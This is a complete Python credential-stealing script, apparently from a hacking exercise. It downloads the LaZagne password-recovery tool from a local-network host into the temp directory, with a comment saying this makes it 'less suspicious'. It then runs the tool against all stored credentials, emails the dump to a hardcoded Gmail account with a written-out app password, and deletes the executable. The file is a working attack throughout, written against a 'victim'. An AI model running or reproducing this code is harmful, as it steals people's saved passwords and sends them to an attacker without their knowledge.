#!/usr/bin/env python
import requests, smtplib, re, os, tempfile, subprocess

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file: # wb = write binary
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587) # Google's server runs on port 587
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

# GET THE VICTIM TO DOWNLOAD LAZAGNE, CHANGE DIR TO MAKE IT LESS SUSPICIOUS, THEN REPORT TO MAIL

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("192.168.18.139/muhehehe/laZagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("acaroglugoktan@gmail.com", "jtan qyoi bbqs ylyu", result)
os.remove("laZagne.exe")
